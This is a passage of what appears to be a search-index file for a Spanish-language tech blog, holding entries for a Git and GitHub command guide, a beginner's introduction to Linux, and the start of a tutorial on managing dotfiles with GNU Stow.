el estado actual.\ngit diff: Compara cambios no confirmados.\ngit log\ngit log --graph\ngit log --graph --pretty=oneline\ngit log --graph --decorate --all --oneline\ngit config --global alias.tree \"log --graph --decorate --all --oneline\"\ngit tree\ngit log --oneline: Historial compacto. Ejemplo:\n7e320e8 update\ngit blame [archivo]: Autores y fechas de cambios.\ntouch .gitignore\n\n\n\n\n\nCrea y cambia a una rama:\n\nNavegando en ramas - git checkout holagit.py - git log - git checkout 707c7f864de5e036c54b43df5a1bfa464fb4d9ba - git tree - git checkout 380beab Creando ramas\ngit checkout -b nueva-rama\ngit branch login git switch login\n\nFusiona ramas:\ngit checkout main\ngit merge nueva-rama\n\ngit switch login git merge main git tree\ncorrección de conflicto\n\ngit merge main\nconflicto tal vez por que se modifico la mimsa linea en distintos branch\ncorregir el error\ngit add archivo_conflicto.py\ngit commit -m \"correccion conflicto\"\n\n\nReset\n\n\ngit tree\ngit reset --hard af18c2a\ngit log\ngit reflog log completo\ngit checkout 380beab\n\n\nEtiqueta un commit: (Para versiones)\ngit tag v1.0.0\ngit push origin main --tags\n\n\ngit tag clase_1\ngit log o git tree\ngit tag Listado de tags\ngit checkout tags/clase_1"
  },
  {
    "objectID": "operating-system/2023-02-16-guia-de-git-y-github/index.html#cómo-funciona-git",
    "href": "operating-system/2023-02-16-guia-de-git-y-github/index.html#cómo-funciona-git",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Git organiza los proyectos en tres áreas principales: - Directorio de trabajo: Donde editas tus archivos. - Área de preparación (staging): Donde preparas los cambios antes de confirmarlos. - Directorio Git: Almacena las instantáneas confirmadas de tu proyecto.\nDisponible en Linux, Windows y macOS, Git tiene una curva de aprendizaje inicial, pero su dominio abre un mundo de posibilidades para gestionar proyectos eficientemente."
  },
  {
    "objectID": "operating-system/2023-02-16-guia-de-git-y-github/index.html#comandos-básicos-de-git",
    "href": "operating-system/2023-02-16-guia-de-git-y-github/index.html#comandos-básicos-de-git",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Aquí tienes los comandos fundamentales:\n\necho \"# Léeme\" &gt;&gt; README.md: Crea un archivo README.md con el texto “# Léeme”.\ngit init: Inicia un nuevo repositorio en el directorio actual.\ngit add [file]: Añade un archivo al área de preparación.\ngit commit -m \"Primer commit\": Guarda los cambios con un mensaje descriptivo.\ngit branch -M main: Muestra las ramas existentes.\ngit remote add origin git@github.com:achalmed/repositorio.git : Vincula el repositorio local con uno remoto en GitHub.\ngit push -u origin main: Envía los cambios al repositorio remoto.\ngit status: Muestra el estado actual del repositorio.\ngit log: Lista el historial de commits.\ngit diff: Compara cambios no confirmados con el último commit.\ngit checkout [branch]: Cambia a una rama específica.\ngit merge [branch]: Fusiona una rama con la actual.\ngit config --global user.name \"tu-nombre\": Configura tu nombre de usuario.\ngit config --global user.email \"tu-email@example.com\": Configura tu correo."
  },
  {
    "objectID": "operating-system/2023-02-16-guia-de-git-y-github/index.html#instalación-de-git-en-ubuntu",
    "href": "operating-system/2023-02-16-guia-de-git-y-github/index.html#instalación-de-git-en-ubuntu",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Verifica si Git está instalado:\ngit --version\nEjemplo de salida: git version 2.34.1\nSi no está instalado, actualiza e instala con APT:\nsudo apt update\nsudo apt install git\nConfigura tu identidad:\ngit config --global user.name \"Tu Nombre\"\ngit config --global user.email \"tu.correo@example.com\"\nVerifica la configuración:\ngit config --list\n\n\n\n\n\nInstala las dependencias:\nsudo apt update\nsudo apt install libz-dev libssl-dev libcurl4-gnutls-dev libexpat1-dev gettext cmake gcc\nDescarga y descomprime la versión deseada (ejemplo: 2.34.1):\nmkdir tmp && cd tmp\ncurl -o git.tar.gz https://mirrors.edge.kernel.org/pub/software/scm/git/git-2.34.1.tar.gz\ntar -zxf git.tar.gz\ncd git-*\nCompila e instala:\nmake prefix=/usr/local all\nsudo make prefix=/usr/local install\nexec bash\nConfirma la instalación:\ngit --version"
  },
  {
    "objectID": "operating-system/2023-02-16-guia-de-git-y-github/index.html#configuración-de-claves-ssh-para-github",
    "href": "operating-system/2023-02-16-guia-de-git-y-github/index.html#configuración-de-claves-ssh-para-github",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Verifica claves existentes:\nls -al ~/.ssh\nSi no hay claves, crea el directorio: mkdir ~/.ssh.\nGenera un par de claves:\nssh-keygen -t rsa -b 4096 -C \"tu.email@example.com\"\nAcepta el nombre predeterminado y añade una contraseña (opcional).\n\n\n\n\n\nInicia el agente:\neval \"$(ssh-agent -s)\"\nAñade la clave privada:\nssh-add ~/.ssh/id_rsa\n\n\n\n\n\nCopia la clave pública:\n\nLinux/Mac: cat ~/.ssh/id_rsa.pub\nWindows: clip &lt; ~/.ssh/id_rsa.pub\n\nEn GitHub, ve a Settings &gt; SSH and GPG keys &gt; New SSH key, pega la clave y guárdala.\nPrueba la conexión:\nssh -T git@github.com\nResultado esperado: Hi tu_usuario! You've successfully authenticated..."
  },
  {
    "objectID": "operating-system/2023-02-16-guia-de-git-y-github/index.html#crear-un-repositorio-local",
    "href": "operating-system/2023-02-16-guia-de-git-y-github/index.html#crear-un-repositorio-local",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Inicia un repositorio:\ngit init [nombre-del-proyecto]\nAñade archivos y haz un commit:\ngit add .\ngit commit -m \"Primer commit\""
  },
  {
    "objectID": "operating-system/2023-02-16-guia-de-git-y-github/index.html#clonar-un-repositorio",
    "href": "operating-system/2023-02-16-guia-de-git-y-github/index.html#clonar-un-repositorio",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Clona un repositorio remoto:\ngit clone https://github.com/usuario/repositorio.git\nClonación en carpeta específica\ngit clone https://github.com/usuario/repositorio.git /ruta/deseada\n\n\n\nSolo las últimas n confirmaciones:\ngit clone --depth=1 https://github.com/usuario/repositorio.git\n\n\n\ngit clone --branch=nombre-rama https://github.com/usuario/repositorio.git"
  },
  {
    "objectID": "operating-system/2023-02-16-guia-de-git-y-github/index.html#subir-un-proyecto-a-github",
    "href": "operating-system/2023-02-16-guia-de-git-y-github/index.html#subir-un-proyecto-a-github",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Crea un repositorio en GitHub (público o privado).\nEn tu proyecto local:\n\nCon SSH\necho \"# examen\" &gt;&gt; README.md\ngit init\ngit add .\ngit commit -m \"Primer commit\"\ngit branch -M main\ngit remote add origin git@github.com:usuario/repositorio.git\ngit push -u origin main\nCon HTTPS\necho \"# examen\" &gt;&gt; README.md\ngit init\ngit add .\ngit commit -m \"Primer commit\"\ngit branch -M main\ngit remote add origin https://github.com/usuario/repositorio.git\ngit push -u origin main\n\nSi aparece el error remote origin already exists:\ngit remote rm origin\nLuego repite el paso 2."
  },
  {
    "objectID": "operating-system/2023-02-16-guia-de-git-y-github/index.html#observar-el-repositorio",
    "href": "operating-system/2023-02-16-guia-de-git-y-github/index.html#observar-el-repositorio",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "git status: Muestra el estado actual.\ngit diff: Compara cambios no confirmados.\ngit log\ngit log --graph\ngit log --graph --pretty=oneline\ngit log --graph --decorate --all --oneline\ngit config --global alias.tree \"log --graph --decorate --all --oneline\"\ngit tree\ngit log --oneline: Historial compacto. Ejemplo:\n7e320e8 update\ngit blame [archivo]: Autores y fechas de cambios.\ntouch .gitignore"
  },
  {
    "objectID": "operating-system/2023-02-16-guia-de-git-y-github/index.html#trabajar-con-ramas",
    "href": "operating-system/2023-02-16-guia-de-git-y-github/index.html#trabajar-con-ramas",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "",
    "text": "Crea y cambia a una rama:\n\nNavegando en ramas - git checkout holagit.py - git log - git checkout 707c7f864de5e036c54b43df5a1bfa464fb4d9ba - git tree - git checkout 380beab Creando ramas\ngit checkout -b nueva-rama\ngit branch login git switch login\n\nFusiona ramas:\ngit checkout main\ngit merge nueva-rama\n\ngit switch login git merge main git tree\ncorrección de conflicto\n\ngit merge main\nconflicto tal vez por que se modifico la mimsa linea en distintos branch\ncorregir el error\ngit add archivo_conflicto.py\ngit commit -m \"correccion conflicto\"\n\n\nReset\n\n\ngit tree\ngit reset --hard af18c2a\ngit log\ngit reflog log completo\ngit checkout 380beab\n\n\nEtiqueta un commit: (Para versiones)\ngit tag v1.0.0\ngit push origin main --tags\n\n\ngit tag clase_1\ngit log o git tree\ngit tag Listado de tags\ngit checkout tags/clase_1"
  },
  {
    "objectID": "operating-system/2023-02-16-guia-de-git-y-github/index.html#sincronización",
    "href": "operating-system/2023-02-16-guia-de-git-y-github/index.html#sincronización",
    "title": "Guía de Git Cómo trabajar en equipo en proyectos",
    "section": "Sincronización",
    "text": "Sincronización\n\ngit fetch origin: Descarga cambios remotos sin fusionarlos.\ngit pull origin main: Descarga y fusiona cambios.\ngit push origin main: Envía cambios locales al remoto."
  },
  {
    "objectID": "operating-system/2023-05-02-00-primeros-pasos-en-linux/index.html",
    "href": "operating-system/2023-05-02-00-primeros-pasos-en-linux/index.html",
    "title": "Linux Primeros Pasos",
    "section": "",
    "text": "LINUX primeros pasos como usuario\nSISTEMAS OPERATIVOS\nSISTEMA OPERATIVO es el conjunto de programas que proporciona los mecanismos y reglas básicas de funcionamiento para acceder a los recursos del ordenador de forma adecuada, especialmente a todos los dispositivos periféricos.\n\nMS-DOS\nWINDOWS\nMac-OS\nUNIX (Grandes máquinas) ——  LINUX (PCs)\n\nTipos de programas:\n\nProgramas de Control: Gestión de software y hardware, p.e. colas de impresión, etc.\nUtilidades del sistema: editores de texto, compiladores, gestión de correo, etc.\n\nORIGEN Y DESARROLLO DE LINUX\n\nCreado por Linus Torvalds en 1991. Inspirado en UNIX.\nSistema multiusuario y multitarea.\nDesarrollado por miles de programadores en la red.\nFilosofía GNU. Libre distribución bajo GPL (General Public License).\nNo garantizado. Flexible, estable y barato.\nAl principio no era fácil de usar, porque estaba pensado para programadores.\nCada vez se desarrollan más aplicaciones y utilidades pensando en usuarios no programadores, para facilitar el uso de INTERNET y competir con WINDOWS.\n\nDistribuciones: Núcleo (Kernel) de Linux +  Aplicaciones y Utilidades para un grupo específico de usuarios\n\nAlgunas distribuciones son gratuitas y otras no.\nAlgunas de las distribuciones están mantenidas por empresas comerciales (ej. RedHat, Fedora, openSUSE, Ubuntu), y otras son mantenidas por una comunidad de programadores (ej. Debian).\nNormalmente se obtiene una distribución descargándola de Internet.\nDistribuciones mas usadas:\n\nDebian\nSlackware\nSUSE\nCaldera\nRed Hat Enterprise Linux(comercial)\nFedora Project (basada en RedHat)\nMandriva (basada en RedHat)\nUbuntu (basada en Debian)\nGuadalinex (basado en Debian, promovido por la Junta de Andalucía)\n\n\nPRIMEROS PASOS\nARRANQUE DEL SISTEMA\n\nLILO o GRUB: programa que se encarga de arrancar el S.O. deseado por el usuario cuando coexisten Windows y Linux\n\nINICIO DE UNA SESIÓN DE USUARIO\n\nLogin:Nombre del usuario.\nPassword: Contraseña secreta de acceso privado de cada usuario. (Sólo aparecen asteriscos cuando se teclea)\n\nELECCIÓN DE PASSWORDS\nLa utilización de passwords está hoy en día extendida a muchos aspectos de la vida cotidiana, no sólo a la utilización de máquinas compartidas.\nLa elección de un password seguro es tanto más crucial cuanto mayor sea la importancia de lo que “protege”: cuentas bancarias, messenger, cuenta de e-mail, reserva de biletes de tren, etc.\nPasswords no seguros pueden ser averiguados por programas especializados en un tiempo inferior a 1 segundo (por ejemplo para una palabra de diccionario) o en pocas horas (passwords de hasta 6 caracteres formados por letras mayúsculas, minúsculas y números).\nVariantes del tipo sustituir A por 4 , la E por un 3, o la I por un 1 están ya incorporadas en los crackers.\nRecomendación para passwords importantes:\n\nUtilizar passwords cuanto más largos mejor, al menos de 6 caracteres (mejor 8)\nUtilizar letras mayúsculas, minúsculas, números y caracteres especiales  como ! ” $ % & / ( ) = ? ¿\nEl tiempo para crackear un password así con 8 caracteres es de 39 años !!!\n\nLo que NO debes hacer con un password:\n\nApuntarlo en un post-it y pegarlo en la pantalla\nDecírselo a cualquiera\nUsar palabras de un diccionario, ni siquiera concatenadas (megustaminovio)\nUsar passwords de menos de 6 caracteres\nLlevar las claves de tarjetas y los passwords de las cuentas bancarias por internet en la cartera, o en una agenda en el bolso.\n\nEL PROBLEMA DE LOS BUENOS PASSWORDS ES ACORDARSE DE ELLOS: aqui tienes un truco\nPiensa en una frase y utiliza las iniciales de las palabras, mezcladas con números y algún signo, de forma que  puedas recordarla.\nEjemplos:\nE95faP+L\n(El 95 fui a Paris y Londres)\nUiv+q%p\n(Una imagen vale más que 100 palabras)\n2+2s4!\n(dos más dos son cuatro!)\n$90%pa\n(somos 90 por ciento pura agua)\nVaLy$l\n(Vente conmigo a Lepe y serás lepera)\nPuedes crear tus propias reglas personales: elegir las segundas letras, tomar las dos primeras …\nCAMBIO DEL PASSWORD DE USUARIO\n\nElegir una contraseña nueva atendiendo a las recomendaciones anteriores.\nAbrir un Emulador de Terminal desde el panel.\nTeclear en la Linea de Comandos del terminal una de los siguientes instrucciones:\n\n\npasswd (para instalaciones locales de Linux)\nyppasswd (para instalaciones de Linux con sistema de archivos compartidos)\n\n\nTeclear la contraseña actual.  (No se visualiza)\nTeclear la nueva contraseña.  (No se visualiza)\nConfirmar la nueva contraseña. (No se visualiza)\nSalir del terminal con la instrucción exit\n\nSALIDA DE LA SESIÓN\n\nSesión Failsafe:  tecleando  exit\nSesiones en entorno de ventanas:  eligiendo Terminar en el Menú de Inicio.\n\nCIERRE DEL SISTEMA\n\nEligiendo Apagar o Reiniciar en el Menú Sistema\n\nSISTEMA MULTIUSUARIO\n\nLINUX  puede tener habilitados muchos usuarios.\nPueden trabajar simultáneamente a través de la red.\nCada usuario tiene una cuota de disco duro, una cantidad máxima de disco que puede usar.\nHay un superusuario llamado  root  que actua como administrador del sistema y que dispone de permisos PARA TODO. Son funciones exclusivas del  root:\nHabilitar y deshabilitar usuarios.\nCambiar contraseñas de otros usuarios.\nAsignar o modificar las cuotas de disco.\nDecidir qué aplicaciones y utilidades puede usar cada usuario.\nOrganizar a los usuarios por grupos.\nInstalar o desinstalar programas.\n\nNota: Es muy importante reservar el usuario root exclusivamente para labores de administración del sistema, incluso cuando se instale un sistema LINUX particular, es decir, que vaya a ser utilizado por un único usuario. Debe tenerse en cuenta que, debido a que el root dispone de TODOS LOS PERMISOS, un error puede resultar catastrófico. Por ello se debe dar de alta, al menos, un usuario “corriente” y trabajar habitualmente con esa cuenta. Utilizar la cuenta del root sólo para administración, instalación de nuevo software, etc.\nNUNCA utilices la cuenta del root para acceder a Internet. Y esmérate con su password.\nMODOS DE TRABAJO\n\nModo de comandos: El usuario se comunica con el ordenador mediante la Linea de Comandos de un terminal o de un emulador de terminal. Estos comandos o instrucciones pueden ser interpretados por el sistema usando diferentes programas denominados Shell. (Lo usaremos sólo esporádicamente).\nModo gráfico: El usuario se comunica con el ordenador  mediante un Interfaz Gráfico de Usuario (GUI) que se encarga de interpretar las diferentes acciones realizadas con el teclado o con el ratón sobre diferentes objetos gráficos como iconos, botones, ventanas,  menús, barras de desplazamiento (scroll), lineas separadoras, etc.\nEn UNIX, el GUI habitual es el sistema X Window que está formado fundamentalmente por dos programas:\nServidor X (X Server): programa que dibuja en la pantalla los objetos gráficos\nGestor de Ventanas (Window Manager): los más usados son  GNOME y  KDE.\n\nSISTEMA DE ARCHIVOS Y CARPETAS\nNOMBRES DE FICHEROS Y DIRECTORIOS\nArchivos o Ficheros (Files) : Reglas para los nombres\n\nDe 1 a  255 caracteres. Se pueden usar todos menos el     **/**      aunque …\nNo es recomendable usar caracteres como       =   ^   ~   ’   “   `   *   ;   -   ?   [ ] ( ) ! & &gt; &lt;\nPueden aparecer sólo números\nSe distinguen mayúsculas y minúsculas: README no es lo mismo que ReaDme\nIMPORTANTE: Si se van a compartir archivos con WINDOWS no se debe usar esa distinción\nLos nombres de archivos pueden, aunque no es necesario, llevar una extensión o sufijo (lo que aparece al final del nombre, después de un punto) :    Nombre.extension\nLas extensiones sirven principalmente a título orientativo. Algunos programas reconocen determinadas extensiones y las aceptan “por defecto”:\ntxt para archivos de texto\nhtm  y html para archivos de hipertexto (formato usual de las páginas de Internet)\npng,  tif,  jpg y gif para archivos de imagenes en distintos formatos\nf  y  f90 para archivos fuente en lenguaje Fortran\nm  archivos conteniendo programas MATLAB\netc.\n\nCarpetas o Directorios (Folder o Directory)\n\nTipo especial de fichero que contiene a su vez otros ficheros y/o subcarpetas.\nMismas reglas para los nombres que los ficheros.\nLas carpetas no suelen tener extensiones.\n\nESTRUCTURA DEL SISTEMA DE FICHEROS\nEl sistema de archivos es, más o menos, “la forma de organizar la información almacenada en el disco duro”. La mayoría de los sistemas operativos posee su propio sistema de archivos. El sistema de archivos nativo de Linux es el EXT2. Normalmente, los sistemas operativos proveen los mecanismos para crear, mover, renombrar y eliminar tanto archivos como directorios.\nLa estructura de directorios suele ser jerárquica, ramificada o “en árbol”:\nLa estructura de directorios que sigue Linux es similar a la de cualquier sistema UNIX. La estructura del sistema de archivos NO está ligada de forma directa a la estructura de hardware. A diferencia de Windows, es independiente del número de discos duros, disqueteras o CDROMs. No hay una “unidad” para cada unidad física de disco o partición como en Windows (A:**, C:**, etc.), sino que todos los discos duros o de red se montan bajo un sistema de directorios en árbol, y algunos de esos directorios enlazan con estas unidades físicas de disco. IMPORTANTE: Las barras en Linux al igual que en cualquier UNIX son inclinadas hacia la derecha, como se puede ver más abajo (ese es el motivo de que en internet sean inclinadas hacia la derecha, ya que nació bajo UNIX).\n\nEstructura jerárquica de árbol invertido:\nDesde una carpeta raiz, denotada por  / , “cuelgan” otros archivos y/o carpetas.\nDe cada subcarpeta pueden “colgar” a su vez otros archivos y/o carpetas.\netc\n“Colgar” significa  “estar contenido en”\nTodos los archivos y/o carpetas están  finalmente colgados de la carpeta raíz  /\nCarpeta “padre” de una carpeta es aquella que la contiene y está en el nivel inmediatamente superior de la estructura de árbol.\n\nLa ubicación de un fichero en la estructura de archivos se denota mediante su path ó ruta: se trata de una cadena de caracteres que incluye todo el “camino” de directorios que llevan desde el directorio raiz (  /  ) hasta el fichero considerado. Se separa un directorio del siguiente de nuevo mediante el caracter especial   /   .\nEjemplo: el path  /usr/local/bin/readme.txt  indica la ubicación del fichero de nombre  readme.txt  que cuelga de la carpeta  bin  que a su vez cuelga de la carpeta  local  que a su vez cuelga de la carpeta  usr  que cuelga de la raiz del sistema de archivos   /  .\nALGUNOS DIRECTORIOS IMPORTANTES\nLos directorios principales que podemos encontrar en cualquier sistema Linux son:\nDirectorio\nDescripción\n/\nEs la raíz del sistema de directorios. Aquí se monta la partición principal Linux EXT.\n/etc\nContiene los archivos de configuración de la mayoría de los programas.\n/home\nContiene los archivos personales de los usuarios.\n/bin\nContiene comandos básicos y muchos programas.\n/dev\nContiene archivos simbólicos que representan partes del hardware, tales como discos duros, memoria…\n/mnt\nContiene subdirectorios donde se montan (se enlaza con) otras particiones de disco duro, CDROMs, etc.\n/tmp\nFicheros temporales o de recursos de programas.\n/usr\nProgramas y librerías instalados con la distribución\n/usr/local\nProgramas y librerías instalados por el administrador\n/sbin\nComandosadministrativos\n/lib\nLibrerías varias y módulos (“trozos”) del kernel\n/var\nDatos varios como archivos de log (registro de actividad) de programas, bases de datos, contenidos del servidor web, copias de seguridad…\n/proc\nInformación temporal sobre los procesos del sistema (explicaremos esto más en profundidad posteriormente).\nOTROS CONCEPTOS RELACIONADOS CON DIRECTORIOS:\n\nDirectorio o Carpeta de trabajo (Working Directory): es, en cada momento, el directorio en que se está trabajando. Cualquier fichero que el S.O. tenga que buscar, lo hará en primer lugar en dicho directorio.\nRuta (Path) de un fichero: secuencia de directorios, separados por el símbolo /,  que se ha de recorrer en la estructura de árbol para llegar a un fichero determinado.\nPath absoluto: muestra toda la ruta desde la raiz del sistema de ficheros /\nPath relativo: muestra la ruta desde el directorio de trabajo.  Puede empezar en:\nuna subdirectorio del directorio de trabajo,  si el camino es descendente\n. .  si el camino comienza de forma ascendente\n.   denota el directorio de trabajo\n. .  denota el directorio padre del directorio de trabajo\nDirectorio o carpeta personal de un usuario (home directory): es el que contiene los ficheros de un usuario del sistema. Cada usuario tiene su propio directorio personal. Frecuentemente, los directorios personales cuelgan del directorio /home, es decir, son de la forma /home/usuario. Cuando se empieza una sesión en un sistema Linux, de forma automática se elige el home directory como working directory.\n\nPUNTOS DE MONTAJE DE DISPOSITIVOS:\nEn Linux, los distintos dispositivos conectados al ordenador forman parte del sistema de archivos, de manera que, una vez montados, para el usuario son como una carpeta más del sistema de ficheros. Habitualmente se montan en /mnt\nPor ejemplo, la disquetera suele ser  /mnt/floppy    y el  CDROM   suele ser   /mnt/cdrom\nSISTEMAS DE ARCHIVOS COMPARTIDOS Yellow Pages\nEste sistema permite que un conjunto de máquinas con sistemas Linux  conectadas en red compartan un sistema de archivos común. Esto permite que todos los usuarios de esas máquinas dispongan de todos sus archivos en todas las máquinas. En este caso, el sistema de archivos suele estar físicamente en una de las máquinas. Un usuario puede, así, acceder a cualquiera de las máquinas con el mismo login y el mismo password.\nCuando se usa el servicio yellow pages (páginas amarillas), para cambiar el password de un usuario es necesario utilizar el comando yppasswd  en lugar de passwd.\nPROPIEDAD, PERMISOS Y DERECHOS DE ACCESO A CARPETAS Y FICHEROS\nAl ser Linux un sistema multiusuario, es preciso que esté definido de quién es cada cosa (carpetas y ficheros) y qué derechos de acceso tiene cada usuario.\nCada usuario es propietario, en general, de todos los ficheros y subdirectorios que cuelgan de su directorio personal: puede crear, modificar y borrar en él todo lo que quiera. Ningún otro usuario (excepto el root) puede acceder a los ficheros de otro, ni siquiera verlos.\nEn Linux, cada fichero y carpeta tiene un propietario (owner). El propietario es el que define los permisos de acceso de otros usuarios a sus ficheros. Para ello, el conjunto de usuarios de una máquina se entiende dividido en tres grupos:\n\nel mismo propietario (owner)\nel grupo de usuarios al que pertenece el propietario (group)\nel resto del mundo (world)\n\nDichos permisos, a su vez, son de tres tipos:\n\nde lectura (read)\nde escritura (write)\nde ejecución (execute)\n\nLos permisos de acceso a un fichero sólo los puede cambiar el propietario y el (todopoderoso) root. En general, cada usuario puede leer en el resto de directorios del sistema de ficheros, excepto en la del root y en las de los otros usuarios.\n\nLos ficheros y carpetas del sistema son propiedad del root\nLos ficheros y carpetas de programas instalados son propiedad del  root\nEl  root tiene todos los permisos sobre todos los ficheros de todos los usuarios.\n\nEL GESTOR DE VENTANAS KDE\nPANTALLA KDE:\nPanel de KDE:\n\nMenú de inicio de aplicaciones\nEscritorios virtuales\nDirectorio Personal\nLista de ventanas abiertas\nEmulador de Terminal\nEditores sencillos: Kedit, Kwrite\n\nVentanas:\n\nBarra de títulos:\nIcono de aplicación (Manipulación de ventanas)\nFijación de ventana\nMinimizar, maximizar y cerrar\nBarra de menús\nBarra de herramientas\n\nKonqueror: Gestor gráfico de archivos (File Manager):\n\nNavegar por la estructura de directorios\nCrear y borrar carpetas\nCopiar y mover carpetas\nCambiar nombre a ficheros y carpetas\nAbrir y borrar ficheros\nVer y modificar las propiedades de ficheros y carpetas\n\nKonsole: Emulador de terminal\nSe usa para trabajar con el Sistema Operativo en modo de comandos, es decir para introducir directamente instrucciones UNIX al sistema. Las instrucciones se escriben en la Línea de Comandos, después del prompt del usuario.\nALGUNOS COMANDOS:\nclear\nlimpia la pantalla\ndate\ndevuelve la fecha y hora actuales\ncal\nmuestra el calendario\nhistory\nmuestra la historia de los últimos comandos usados\nman comando\nMuestra la página del manual correspondiente al comando\nmore file\nSi file es un fichero de texto, lo muestra de página en página. Se pasa página con la barra espaciadora. Se termina con q\nls\nmuestra el contenido del directorio de trabajo\nls -l\nmuestra el contenido del directorio de trabajo en forma de lista, incluyendo información extra\nls -a\nmuestra el contenido del directorio de trabajo incluídos los ficheros ocultos\nls dir\nejecuta ls sobre el directorio dir - se pueden usar opciones: ls -la dir\npwd\nmuestra el nombre del directorio de trabajo (print working directory)\ndf\nmuestra el espacio libre y usado en los discos\ndu -sk dir\nmuestra la cantidad de espacio de disco usada por el directorio dir (y todo lo que hay dentro)\ndu -Sk dir\nlo mismo, pero especificando por subdirectorios\nmkdir name\ncrea un directorio de nombre name (make directory) - si name no incluye un path, el directorio se crea en el directorio de trabajo\nrm fich\nborra el fichero fich (remove)\nrmdir direc\nborra el directorio  dir (tiene que estar vacío)\nrm -i fich\nantes de borrar el fichero fich, pide confirmación (modo interactivo)\ncp fich dir\ncrea una copia del fichero fich en el directorio dir\ncp fich1 fich2\ncrea una copia del fichero fich1 y le pone el nombre fich2\nmv fich dir\n“mueve” el fichero fich  al directorio dir\nmv fich1 fich2\n“mueve” el fichero fich1  al fichero fich2 (es decir, lo cambia de nombre) (fich2 puede también incluir un path; en ese caso también lo cambia de sitio)\ncd\ncambia el directorio de trabajo al directorio personal (home)\ncd dir\ncambia el directorio de trabajo al directorio dir\ncd ..\ncambia el directorio de trabajo al “padre” del actual\nps\nproporciona información sobre los procesos activos del usuario\nps aux\nproporciona información sobre todos los procesos activos en el sistema\nkill -9 PID\nelimina el proceso con número de identificación PID\ngzip fich\ncrea un fichero de nombre fich.gz, comprimido de fich\ngunzip fich.gz\ndescomprime el fichero fich.gz\ntar\ncondensa directorios en un sólo fichero y viceversa\ntar -cf file.tar direc\ncrea el fichero file.tar con el contenido del directorio direc\ntar -cvf file.tar direc\nlo mismo, pero con explicaciones (v==verbose)\ntar -xf file.tar\nextrae los ficheros de file.tar\ntar -xvf file.tar\nlos mismo, pero con explicaciones\nexit\nfinaliza la sesión de trabajo; en un terminal, cierra el terminal.\nPERSONALIZACIÓN DE LAS CUENTAS:\n\nel fichero de configuración .bashrc\ndefinición o modificación de comandos: alias\nvariable de entorno PATH: definición de los caminos de búsqueda\nejecución de un fichero de configuración: source\n\nMODIFICACIÓN DEL FICHERO DE CONFIGURACIÓN .bahsrc PARA EL ACENTO ^ EN MATLAB:\n\nEn el directorio personal, editar el fichero oculto .bashrc\nAñadir, al final, la orden: setxkbmap -variant nodeadkeys\n\n\n\nPublicaciones Similares\nSi te interesó este artículo, te recomendamos que explores otros blogs y recursos relacionados que pueden ampliar tus conocimientos. Aquí te dejo algunas sugerencias:\n\n Comandos De Informacion Windows\n Adb\n Limpieza Y Optimizacion De Pc\n Usando Apk En Windown 11\n Gestionar Versiones De Jdk En Kubuntu\n Instalar Tor Browser\n Crear Enlaces Duros O Hard Link En Linux\n Comandos Vim\n Guia De Git Y Github\n 00 Primeros Pasos En Linux\n 01 Introduccion Linux\n 02 Distribuciones Linux\n 03 Instalacion Linux\n 04 Administracion Particiones Volumenes\n Atajos De Teclado Y Comandos Para Usar Vim\n Instalando Specitify\n\nEsperamos que encuentres estas publicaciones igualmente interesantes y útiles. ¡Disfruta de la lectura!\n\n\n\n\nReutilizaciónCC BY-SA 4.0Cómo citarPor favor, cita este trabajo como:\nAchalma, Edison. 2023. “Linux Primeros Pasos,” May. https://achalmaedison.netlify.app/operating-system/2023-05-02-00-primeros-pasos-en-linux/."
  },
  {
    "objectID": "operating-system/2025-07-10-gestiona-tus-dotfiles-con-gnu-stow/index.html",
    "href": "operating-system/2025-07-10-gestiona-tus-dotfiles-con-gnu-stow/index.html",
    "title": "Cómo Gestionar Dotfiles con GNU Stow",
    "section": "",
    "text": "¿Alguna vez has perdido horas configurando tu terminal o editor tras cambiar de computadora? Los dotfiles, esos archivos ocultos como .bashrc o .gitconfig, guardan tus personalizaciones, pero gestionarlos a mano es un caos. GNU Stow simplifica todo: organiza tus configuraciones en un repositorio central y usa enlaces simbólicos para sincronizarlas en minutos. Este tutorial te guía paso a paso para instalar Stow, crear un repositorio de dotfiles, enlazar configuraciones y automatizar el proceso. ¡Di adiós a las configuraciones repetitivas y toma el control de tu entorno!\nCon Stow, tus configuraciones personalizadas estarán siempre a un comando de distancia. Aprenderás a centralizar archivos como .zshrc o .config/nvim, integrarlos con Git y desplegarlos en Linux, macOS o WSL sin complicaciones. ¿Listo para optimizar tu flujo de trabajo? Sigue leyendo y descubre cómo GNU Stow transforma la gestión de dotfiles en algo simple y poderoso."
  },
  {
    "objectID": "operating-system/2025-07-10-gestiona-tus-dotfiles-con-gnu-stow/index.html#qué-son-los-dotfiles-y-por-qué-importan",
    "href": "operating-system/2025-07-10-gestiona-tus-dotfiles-con-gnu-stow/index.html#qué-son-los-dotfiles-y-por-qué-importan",
    "title": "Cómo Gestionar Dotfiles con GNU Stow",
    "section": "¿Qué son los Dotfiles y Por Qué Importan?",
    "text": "¿Qué son los Dotfiles y Por Qué Importan?\n\nDefinición de Dotfiles y su Rol\nLos dotfiles son archivos ocultos en sistemas Unix-like (Linux, macOS) que empiezan con un punto (ej., .zshrc, .gitconfig, .config/nvim). Almacenan configuraciones personalizadas para tu terminal, editor de código o gestor de ventanas. Por ejemplo, .bashrc define alias y variables de entorno, mientras que .vimrc ajusta tu editor Vim. Estos archivos son el corazón de tu flujo de trabajo, ya que personalizan tus herramientas favoritas.\n\n\nImpacto en la Productividad del Usuario\nTener dotfiles bien organizados te ahorra horas al replicar tu entorno en nuevas máquinas. Imagina configurar tu shell o editor desde cero tras reinstalar tu sistema: ¡es tedioso! Con una gestión adecuada, puedes clonar tus configuraciones y tener todo listo rápidamente. Esto es clave para desarrolladores que trabajan en múltiples dispositivos o entornos como servidores y laptops.\n\n\nProblemas de la Gestión Manual\nCopiar dotfiles manualmente o usar scripts caseros es lento y arriesgado. Puedes sobrescribir archivos, olvidar configuraciones o perderlas en una reinstalación. Por ejemplo, mover .zshrc a otra máquina sin un sistema organizado puede causar errores si las 